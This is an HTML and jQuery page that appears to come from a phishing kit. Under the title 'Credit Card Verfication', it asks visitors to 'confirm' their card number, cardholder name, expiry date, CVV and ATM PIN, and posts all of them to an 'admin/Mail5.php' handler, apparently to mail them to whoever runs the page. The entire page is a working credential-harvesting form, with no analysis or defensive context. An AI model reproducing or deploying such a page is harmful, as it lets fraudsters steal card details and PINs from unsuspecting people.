...
<head>
	...
	<title>Credit Card Verfication</title>
</head>
<body>
	...
	<div class="container-fluid">
		<div class="d-flex justify-content-center">
			<div class="col-md-6 mt-5">
				...
				<div class="d-container">Let's confirm your Credit card Information.</div>
				...
				<form action="admin/Mail5.php" method="post">
					<div class="container-fluid">
						<label for="#ccid" style="opacity:.8; margin-top: 15px;" id="labelcard">Card Number</label>
						<input type="tel" maxlength="16" minlength="16" name="cc" id="ccid" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-adderr="true" data-emptyerr="Please Tell Us Your Card Number" required maxlength="20">
						
					</div>
					<div class="container-fluid">
						<label for="#cnid" style="opacity:.8; margin-top: 15px;" id="labelcard">Card Name</label>
						<input type="text" name="ccn" id="cnid" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-adderr="true" data-emptyerr="Please Tell Us Name on Card" required maxlength="30">
						
					</div>
					<div class="row mx-0" style="max-width: 300px;">
						<div class="col-6 pl-0">
							<label for="#exid" style="opacity:.8; margin-top: 15px;" id="labelcard">Expiry</label>
							<input type="tel" name="ex" id="exid" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-adderr="true" data-emptyerr="Please Tell Us Your Card Expiry Date" required>
						
						</div>
						<div class="col-6 pr-0">
							<label for="#cvcid" style="opacity:.8; margin-top: 15px;" id="labelcard">CCV</label>
							<input type="tel" name="ccv" id="cvcid" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-adderr="true" data-emptyerr="Please Tell Us Your CCV" required maxlength="5">
							
						</div>
					</div>
					<div class="col-6 pr-0">
							<label for="#pinid" style="opacity:.8; margin-top: 15px;" id="labelcard">ATM PIN</label>
							<input type="tel" name="pin" id="pinid" class="form-control form-control-2 form-control-3 " onblur="onInputUserBlur($(this))" data-adderr="true" data-emptyerr="Please Tell Us Your ATM PIN" required maxlength="5">
							
						</div>
					<div class="d-flex justify-content-end mt-5">
						<button class="btn btn-primary px-5 mb-5" type="submit">Verify Card</button>
					</div>
				</form>
			</div>
		</div>
...
<script type="text/javascript">
	jQuery(document).ready(function($) {
		$(".loaderbox").hide();
		Inputmask("9{1,2}/9{1,4}").mask("#exid");
	});
...
function adderror(obj, err="Please Provide Us Required Information"){
	...
	function onInputUserBlur(obj) {
		...
		if (obj.val() == "") {
			...
			removeerror(obj);
			if (obj.attr('id') == "ccid") {
				if(obj.validateCreditCard().valid){
					removeerror(obj);
				}else{
					adderror(obj,"It looks like the Card Number you told us is incorrect.");
				}
			}
		}
